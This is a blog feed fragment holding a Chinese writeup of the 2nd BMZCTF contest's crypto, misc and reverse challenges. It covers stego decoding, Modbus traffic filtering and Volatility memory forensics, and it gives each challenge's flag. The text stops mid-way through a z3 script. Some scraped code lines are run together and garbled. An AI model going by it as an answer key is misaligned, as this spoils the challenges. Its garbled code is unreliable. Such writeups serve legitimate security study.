src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcXUBsBdNwdO2u196piYRqA4y67RGAS1Ux9xixJFh9IpUXopONsa2FUoC*2fBypu5fGQC9TYCxB49WHgJlGoy7zo!/b&bo=FQY4BAAAAAADNz0!&rf=viewer_4" alt="image-20220124154333389"></p><h1 id="可惜，去不了华为学习"><a href="#可惜，去不了华为学习" class="headerlink" title="可惜，去不了华为学习"></a>可惜，去不了华为学习</h1><h1 id="业已尽力，冲！"><a href="#业已尽力，冲！" class="headerlink" title="业已尽力，冲！"></a>业已尽力，冲！</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届BMZCTF网络安全公开赛官方题解</title>
      <link href="/2022/01/07/2nd%C2%B7BMZCTF%C2%B7Writeup/"/>
      <url>/2022/01/07/2nd%C2%B7BMZCTF%C2%B7Writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第二届“BMZCTF”网络安全公开赛官方题解"><a href="#第二届“BMZCTF”网络安全公开赛官方题解" class="headerlink" title="第二届“BMZCTF”网络安全公开赛官方题解"></a>第二届“BMZCTF”网络安全公开赛官方题解</h1><h2 id="来自"><a href="#来自" class="headerlink" title="来自"></a>来自</h2><blockquote><p><a href="https://www.shangyexinzhi.com/article/4500310.html">网址</a><br>题解最初发布在<strong>知识星球</strong>，这个网址里是爬虫爬的（我猜），所以有些乱码</p><p>这里进行<strong>部分“更正”</strong>（必有错误，观其大概即可），以方便大家学习</p></blockquote><p>也可以选择加入BMZ的知识星球</p><p><img src="https://s2.loli.net/2022/01/07/hEFw638lt57GTkO.png" alt="也可以选择加入BMZ的知识星球"></p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>hex解密 -&gt; 两次base64 解密 -&gt; 一次base32解密</p><h3 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h3><ul><li>爆破zip文件，得到解压密码2022go</li><li>base64解密key.txt,得到密钥babyhappy</li><li>利用UE 查看图片内容，在结尾发现一串字符U2FsdGVkX1+IHXoYmwwOhhOsI9mQ2pVFoGA91Ix/58JMsg==</li><li>经过尝试分析是RC4 解密，得到结果是flag{You_Guess_It}</li></ul><h3 id="do-you-nkow-it"><a href="#do-you-nkow-it" class="headerlink" title="do_you_nkow_it"></a>do_you_nkow_it</h3><p>latex符号，将所有符号打出来后取第一个字母连起来就是flag，使用vscode的latex插件可以直接手点出来。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;Play_with_LaTeX&#125;</span></span><br></pre></td></tr></table></figure><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="easy-misc"><a href="#easy-misc" class="headerlink" title="easy_misc"></a>easy_misc</h3><p><code>what</code>文件开头并不是什么类型的文件头</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/a5f6815ea978b709fc8d09d5f8c3f61f.png" alt="img"></p><p>文件尾发 现端倪， <code>RIFF、 WAVE、fmt</code>等字样，很明显这是 <code>wav</code>文件的文件头</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/084f542cc3283db53456d365ea923425.png" alt="img"></p><p>用Python简单处理、反转字节流数据等到正确的wav文件 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;what&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f: </span><br><span class="line">hex_data = hexlify(f.read()).decode()[::-<span class="number">1</span>] </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.wav&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f1:  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_data), <span class="number">2</span>):</span><br><span class="line">data = hex_data[i:i+<span class="number">2</span>][::-<span class="number">1</span>] </span><br><span class="line">f1.write(unhexlify(data))</span><br></pre></td></tr></table></figure><p>得到的wav文件使用 <code>Audacity</code>分析</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/3ce337c2d93eb4598395e07c01caece6.png" alt="img"></p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/8963a22b5c80fef34bf47688662f6bf1.png" alt="img"></p><p>通过分析不难发现，每一帧高低频区别明显，高频在一定的范围内，低频也在一定的范围内</p><ul><li><pre><code>Python wav模块文档：https://docs.python.org/zh-cn/3/library/wave.html#module-wave<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">首先来简单分析下振幅的规律</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">import wave</span><br><span class="line">obj = wave<span class="selector-class">.open</span>(<span class="string">&#x27;data.wav&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">frames = obj<span class="selector-class">.getnframes</span>()</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&quot;All Frames: &#123;&#125;&quot;</span>.format(frames)</span></span>)</span><br><span class="line">frames_data = obj<span class="selector-class">.readframes</span>(<span class="number">20</span>)<span class="selector-class">.hex</span>()#提取出前<span class="number">20</span>帧的数据</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">0</span>, len(frames_data), <span class="number">4</span>):  </span><br><span class="line">data = frames_data<span class="selector-attr">[i:i+4]</span> </span><br><span class="line">real_data = int(data<span class="selector-attr">[2:]</span> + data<span class="selector-attr">[:2]</span>, <span class="number">16</span>) </span><br><span class="line">data1 = data<span class="selector-attr">[2:]</span> + data<span class="selector-attr">[:2]</span> </span><br><span class="line">print(<span class="string">&quot;第&#123;:&lt;2&#125;帧: &#123;&#125; =&gt; &#123;&#125; 真实数据值: &#123;&#125;&quot;</span><span class="selector-class">.format</span>(int((i+<span class="number">4</span>)/<span class="number">4</span>), data,data1 , real_data))</span><br></pre></td></tr></table></figure></code></pre></li></ul><p>提取出来的每一帧的数据大小为 <code>两字节</code>，且存储方式为 <code>小端存储</code>，所以需要高字节位和低字节位换一下，然后转换成数值</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/c91e647d25050dc856bd311469a2dbc3.png" alt="img"></p><p>先分析正振幅的数据值，通过多次尝试分析，基本就可以确认高振幅范围为： <code>30000-32000</code>，低振幅范围为： <code>18000-20000</code></p><blockquote><p>PS：分析高低振幅取值范围可以提升提取出来的帧数来进行更精确的判断</p></blockquote><p>而负振幅数据无论高振幅还是低振幅，为什么都看起来都不在这个范围之内呢，明明从<code>Audacity</code>中观察到的波形的高低范围和正振幅范围都应该是一样的，而得到的数值确大相径庭呢？</p><p>我们知道如果是 <code>带符号的2字节整型</code>的取值范围是： <code>[-2^(15)] ~ [2^(15)-1]</code>也就是 <code>-32768至32767之间</code></p><p>那么就能解释负振幅数据的问题了，很明显发生了溢出；需要对数值进行一个转换处理即可得到在范围内的正常的数据</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="keyword">import</span> math</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>)-(<span class="number">45650</span>-math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>))<span class="number">19886.0</span><span class="comment">#第二帧</span></span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>)-(<span class="number">47417</span>-math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>))<span class="number">18119.0</span><span class="comment">#第三帧</span></span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>)-(<span class="number">33915</span>-math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>))<span class="number">31621.0</span><span class="comment">#第五帧</span></span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>)-(<span class="number">35258</span>-math.<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">15</span>))<span class="number">30278.0</span><span class="comment">#第十二帧</span></span></span><br></pre></td></tr></table></figure><p>OK，这样就解决了负振幅数据转换的问题 接下来就直接使用Python简单处理，将高低振幅转换成二进制数据即可；然后将得到的二进制数据写成字节流转成文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave, math, struct</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">obj = wave.<span class="built_in">open</span>(<span class="string">&#x27;data.wav&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">frames = obj.getnframes()</span><br><span class="line">frames_data = obj.readframes(frames).<span class="built_in">hex</span>()</span><br><span class="line">bin_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(frames_data), <span class="number">4</span>):  </span><br><span class="line">data = frames_data[idx:idx+<span class="number">4</span>]  </span><br><span class="line">data = data[<span class="number">2</span>:] + data[:<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(data, <span class="number">16</span>) &lt;= <span class="number">20000</span>: </span><br><span class="line">bin_data += <span class="string">&#x27;0&#x27;</span> </span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">int</span>(data, <span class="number">16</span>) &gt; <span class="number">20000</span> <span class="keyword">and</span> <span class="built_in">int</span>(data, <span class="number">16</span>) &lt;= <span class="number">32000</span>: </span><br><span class="line">bin_data += <span class="string">&#x27;1&#x27;</span> </span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">int</span>(data, <span class="number">16</span>) &gt; math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">15</span>): </span><br><span class="line">overflow_data = math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">15</span>) - (<span class="built_in">int</span>(data, <span class="number">16</span>) - math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">15</span>))  </span><br><span class="line"><span class="keyword">if</span> overflow_data &gt; <span class="number">20000</span> <span class="keyword">and</span> overflow_data &lt;= <span class="number">32000</span>: </span><br><span class="line">bin_data += <span class="string">&#x27;1&#x27;</span> <span class="keyword">elif</span> overflow_data &lt;= <span class="number">20000</span>: </span><br><span class="line">bin_data += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">hex_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_data), <span class="number">8</span>): </span><br><span class="line">hex_data += <span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(bin_data[idx:idx+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f1:    </span><br><span class="line">f1.write(unhexlify(hex_data))</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/4a4e4bf39bcff26ae0d78cff44285645.png" alt="img"></p><p>到一张PNG图片，从 <code>binwalk</code>分析来看，文件尾附加了内容</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/9f0b175c44daa14f56b73e4932a75a95.png" alt="img"></p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/b7887888f323c7d8be03283404f65413.png" alt="img"></p><p>附加内容直接看不出来什么，尝试对图片分析，发现存在无密码的LSB隐写</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/6076aa36c7012cc5679d7f957e99a674.png" alt="img"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">hint:</span> <span class="keyword">xor</span> [<span class="number">00</span>-ff] which <span class="keyword">one</span>?</span><br></pre></td></tr></table></figure><p>提示异或一个范围内的一个值，即可猜测附加的数据是经过异或的；可以尝试提取开头的几个字节进行异或看看结果是否为常见文件类型的文件头；Python简单处理即可</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">head_bytes = <span class="string">&#x27;F6 2F 31 38&#x27;</span></span><br><span class="line">for n <span class="meta">in</span><span class="meta"> range(</span>0xff): </span><br><span class="line">hex_data = head_bytes.split(<span class="string">&quot; &quot;</span>) </span><br><span class="line">xor_data = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">for data <span class="meta">in</span> hex_data:  </span><br><span class="line"><span class="keyword">data </span>=<span class="meta"> int(</span>data, 16) ^ n </span><br><span class="line">xor_data += <span class="string">&#x27; &#123;:02x&#125;&#x27;</span>.<span class="meta">format</span>(data)    </span><br><span class="line">p<span class="meta">rint(</span><span class="string">&quot;XOR &#123;:02x&#125;: &#123;&#125;&quot;</span>.<span class="meta">format</span>(n, xor_data))</span><br></pre></td></tr></table></figure><p>从结果中可以发现出现了PNG文件头</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/3ee0c28be7749f32a079eb771d6c263d.png" alt="img"></p><p>将附加数据提取出来，使用 <code>010 Editor</code></p><p>打开 <code>工具-&gt;十六进制运算-&gt;二进制异或</code></p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/bad51b2ec76a480e287d745ca6eb6097.png" alt="img"></p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/b3fac5ffcec0f7e470f45096d117aebd.png" alt="img"></p><p>二维码，扫描即可得到flag </p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/267a6fc71f6534c17f13739b121e8b1a.png" alt="img"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">BMZCTF</span>&#123;<span class="number">755</span>f<span class="number">3</span>d<span class="number">5</span>c-<span class="number">4817</span>-<span class="number">4610</span>-a<span class="number">377</span>-<span class="number">68743</span>f<span class="number">09</span>e<span class="number">60</span>a&#125;</span><br></pre></td></tr></table></figure><h3 id="游戏秘籍"><a href="#游戏秘籍" class="headerlink" title="游戏秘籍"></a>游戏秘籍</h3><p>图片后面接了一个压缩包。但标识位的顺序错了。按504B0304…504B0102….504B0506的顺序调整，即可得到正确的压缩包。</p><p>密码：</p><p>查看图片IDAT后面的CRC，拼接起来。得到：```</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">The_Hint_is</span>:`U<span class="number">1</span>kkgG:VbDE<span class="number">3</span>[<span class="number">1</span>oy[<span class="number">1</span>Ee`DEy`<span class="number">0</span>ghSzF&gt;&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>后面CRC是乱码，将CRC的16进制拼起来，得到： <code>E4B88AE99DA2E5AD97E7ACA6E4B8B2E5BC82E68896E99BB6E58F89E99BB6E4B889E784B6E5908EE59CA8424153453634E8A7A3E7A081E38082</code> hex转字符串得到： <code>上面字符串异或零叉零三然后在BASE64解码</code>。得到密码： <code>What?That_is_a_passwd?!</code></p><p>flag</p><p>解压后：是一个文本，用MD阅读软件打开，使用math方法，得到矩阵，并发现有零宽字节隐写。解密后为25*25的矩阵。每行按 <code>上上下下左左右右ABAB</code>的顺序排列就得到正确的矩阵。再按1涂黑，0涂白，得到二维码。扫码即行flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">BMZCTF</span>&#123;y<span class="number">0</span>u_f<span class="number">1</span>nd_the_<span class="number">4</span>l@g&#125;</span><br></pre></td></tr></table></figure><h3 id="temperature"><a href="#temperature" class="headerlink" title="temperature"></a>temperature</h3><p>根据题目给出的plc梯形图，可以确定温度变送器的量程为0-100℃，裸数据的上、下限为6400-32000，从而确定产品型号为西门子200，后面计算时会用到。</p><p>Encrypted.txt为plc采集上来的温度裸数据值的加密值，范围为6400&lt;=加密数据&lt;=32000，先对Encrypted.txt加密数据进行解密。</p><ul><li>先对数据进行base91解密</li></ul><p><img src="https://img.shangyexinzhi.com/xztest-image/article/f1abb18ca4aecc26258ca8c53228f54f.png" alt="img"></p><ul><li>再进行base85解密</li></ul><p><img src="https://img.shangyexinzhi.com/xztest-image/article/97ac4f0778e176f16dcf291e2d99f651.png" alt="img"></p><ul><li>再进行16进制解码 </li></ul><p><img src="https://img.shangyexinzhi.com/xztest-image/article/28b74790ae267248d819810f0f0c1e0f.png" alt="img"></p><ul><li>解码后为66974超出裸数据最大范围，判断为简单的数字替换编码，进行ROT5解码，最后结果为11429</li></ul><p><img src="https://img.shangyexinzhi.com/xztest-image/article/2f0d987fdde8336b35dc7a00151a7a8c.png" alt="img"></p><ul><li><p>标准电信号是 A0—Am（如：4—20mA）， A/D 转换后数值为 D0—Dm（如：6400—32000），设模拟量的标准电信号是 A，A/D 转换后的相应数值为 D，由于是线性关系，</p><p>函数关系 A＝f（D）可以表示为数学方程：A＝（D－D0）×（Am－A0）／（Dm－D0）＋A0。根据该方程式，可以方便地根据 D 值计算出 A 值。将该方程式逆变换，得出函数关系 D＝f（A）可以表示为数学方程： </p><p>D＝（A－A0）×（Dm－D0）／（Am－A0）＋D0 </p><p>根据公式D = (温度变送器上限-下限)×（采集数据－裸数据下限）／（电流上限－电流下限）＋温度变送器下限，可直接计算出真实温度值</p></li></ul><p><img src="https://img.shangyexinzhi.com/xztest-image/article/1edc760ab14bda6190b746d31814f5ce.jpeg" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">AIW2 = <span class="number">11429</span>  <span class="comment">#解密后的裸数据值</span></span><br><span class="line">D0 = <span class="number">6400</span></span><br><span class="line">DM = <span class="number">32000</span></span><br><span class="line">A0 = <span class="number">4</span></span><br><span class="line">AM = <span class="number">20</span></span><br><span class="line">rangeH = <span class="number">100</span></span><br><span class="line">rangeI = <span class="number">0</span><span class="comment">#量程为0-100℃</span></span><br><span class="line">D = (rangeH-rangeI)*(AIW2-D0)/(DM-D0)+0<span class="built_in">print</span>(<span class="string">&quot;换算后的温度为：&quot;</span>,D)<span class="comment">#精确到3位小数</span></span><br><span class="line"><span class="number">19.64453125</span>--</span><br><span class="line">&gt;&gt;&gt;&gt;<span class="number">19.645</span>D = <span class="number">19.645</span>md_sale = hashlib.md5(<span class="built_in">str</span>(D).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(md_sale)</span><br></pre></td></tr></table></figure><p>根据数模转转换公式最后求得flag为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">32953271</span>ae<span class="number">52</span>e<span class="number">2</span>a<span class="number">652</span>b<span class="number">4</span>dff<span class="number">491</span>dd<span class="number">6</span>aa<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>1、根据题目要求，操作人员在scada系统上对一台设备进行了远程启动，请数据包信息找出发送的启动信息的数值。</p><p>2、一般远程控制大部分用tcp/ip或modbus协议，我们直接过滤modbus协议：找到写命令或是直接用modbus.func_code == 6找到写命令</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/b425f8fba32fe0f58119b840c6398a00.png" alt="img"></p><p>0051进行16进制到10进制解码得到81</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/bb374fcbff469dbb2f7e2c569c21785a.png" alt="img"></p><p>再对81进行md5得到flag值43ec517d68b6edd3015b3edc9a11367b</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/505b5a31ddc029fd5d4f4cc311cfa6d7.png" alt="img"></p><h3 id="hard-misc"><a href="#hard-misc" class="headerlink" title="hard_misc"></a>hard_misc</h3><p>首先下载附件</p><p>使用volatility查看内存中的粘贴板发现存在URL</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/ca6b00e454f579de84ef060e4c54b9bf.png" alt="img"></p><p>并且在进程中发现了notepad.exe</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/8de23cfa80b08e31c7194f8f2cb15abb.png" alt="img"></p><p>dump notepad.exe内存到1380.dmp</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/500bab9865996f9bc70a2d6f9c348de2.png" alt="img"></p><p>使用strings命令发现密码password</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">strings</span> <span class="number">1380</span>.dmp| grep -i <span class="string">&quot;password&quot;</span>……</span><br><span class="line"><span class="attribute">AdministratorPasswordPasswordPassword</span>: ****P@ssw<span class="number">0</span>rd<span class="number">4</span>zip****Password(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>打开链接后发现是图片隐写</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/c1b0b62c6552420bbb7f4d3ac1df056f.png" alt="img"></p><p>使用Python的Pillow库进行图片解析，发现RGB的值只有R和G是随机值，B为0或255</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/b4003b2b4da763fee656756b7255f7ad.png" alt="img"></p><p>提取所有B的值并转换为二进制（255为1时0为0，0为1时255为0）</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/4154858dde11b6512b5c0d3206418b1a.png" alt="img"></p><p>可以看到转换后的值存在一定规律，猜测为Manchester Encoding（曼切斯特编码）</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/4c202f0874eb180bfb731add0fef5cf8.png" alt="img"></p><p>解码后成功获取到原始二进制数据</p><p>转换为ASCII编码后获取到base64编码的字符串</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">UmFyIRoHAQBfZrcbIQQAAAEPfcLH49GPyiSQWUvfPyBHjeg7</span>+R<span class="number">0</span>f<span class="number">0</span>FXFnfecVDfBeSCQ<span class="number">6</span>ey<span class="number">4</span>AO/<span class="number">8</span>o<span class="number">1</span>skWuo/<span class="number">7</span>WfC<span class="number">3</span>f<span class="number">3</span>iB<span class="number">67</span>CTeFvPGysBBX<span class="number">90</span>iGgCVpWB<span class="number">6</span>pNE/yuhoY<span class="number">87</span>FdolPm<span class="number">6</span>gDEKQyQuRu<span class="number">2</span>tmXVyNDsb<span class="number">5</span>GpKb<span class="number">9</span>jb<span class="number">3</span>y<span class="number">4</span>o<span class="number">3</span>kgAX<span class="number">6</span>hiZ+b+awAw/BP<span class="number">36</span>gOD<span class="number">5</span>bZuDHi<span class="number">02</span>rsR+<span class="number">5</span>iWXasXurpI<span class="number">3</span>GOmrWF+pIXDobO<span class="number">1</span>qa<span class="number">3</span>dOi<span class="number">5</span>Exp<span class="number">1</span>Czt<span class="number">2</span>S<span class="number">8</span>BQ+XYqbEDKvh<span class="number">6</span>goVLaENeiHq<span class="number">4</span>rx<span class="number">6</span>EF/j<span class="number">5</span>r<span class="number">8</span>/+gC<span class="number">9</span>u<span class="number">9</span>n+<span class="number">848</span>lgCvHYcNH<span class="number">34</span>A/PcIUGXS<span class="number">6</span>LnmIAFu<span class="number">67</span>zQKuHkIWq<span class="number">1</span>nIVognt/oDpfPUrLe<span class="number">8</span>VfdIj<span class="number">17</span>m<span class="number">1</span>BjxvkmsHn<span class="number">9</span>uwlGoivc<span class="number">8</span>c<span class="number">6</span>iv<span class="number">0</span>j<span class="number">46</span>pRDKrzmLmYowfwmll/L<span class="number">7</span>l/g/Y<span class="number">1</span>snSjjVhXvR<span class="number">8</span>oCzDO<span class="number">8</span>EjnNqiwXerarLfHDq+<span class="number">6</span>FMZW<span class="number">2</span>M<span class="number">3</span>/<span class="number">3</span>VRe<span class="number">3</span>a<span class="number">8</span>=</span><br></pre></td></tr></table></figure><p>解码后通过文件头发现该文件格式为RAR</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/25e5215d13f19c88de3caa996bdd7f74.png" alt="img"></p><p>使用notepad获取到的密码进行解密</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/68c3cb7602fbea1e41d2bcfbba3ce550.png" alt="img"></p><p>打开文件即可获取flag，flag{2ac505ffb2c5deab71d242ec4af148c9}</p><hr><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h3><p>32位程序，主要流程在LPL中</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/ea6bd1f49da099120945aeebe82f5237.png" alt="img"></p><p>直接z3</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/b25ba0f52b231ddd6739f838663e25e9.jpeg" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">P=[<span class="number">12864</span>,<span class="number">5522</span>,<span class="number">10710</span>,<span class="number">6924</span>,<span class="number">788</span>,<span class="number">10715</span>,<span class="number">10008</span>,<span class="number">13022</span>,<span class="number">15893</span>,<span class="number">9754</span>,<span class="number">7946</span>,<span class="number">7490</span>,<span class="number">5636</span>,<span class="number">13477</span>, <span class="number">2198</span>,<span class="number">5861</span>,<span class="number">5799</span>,<span class="number">5259</span>,<span class="number">6464</span>,<span class="number">6171</span>,<span class="number">2269</span>,<span class="number">9251</span>,<span class="number">8315</span>,<span class="number">2989</span>,-<span class="number">199</span>,<span class="number">2680</span>]</span><br><span class="line">a = [z3.BitVec(<span class="string">&quot;p%d&quot;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>)]   </span><br><span class="line">f=<span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">s=Solver()</span><br><span class="line">s.add(a[<span class="number">0</span>]==<span class="built_in">ord</span>(f[<span class="number">0</span>]))</span><br><span class="line">s.add(a[<span class="number">1</span>]==<span class="built_in">ord</span>(f[<span class="number">1</span>]))</span><br><span class="line">s.add(a[<span class="number">2</span>]==<span class="built_in">ord</span>(f[<span class="number">2</span>]))</span><br><span class="line">s.add(a[<span class="number">3</span>]==<span class="built_in">ord</span>(f[<span class="number">3</span>]))</span><br><span class="line">s.add(a[<span 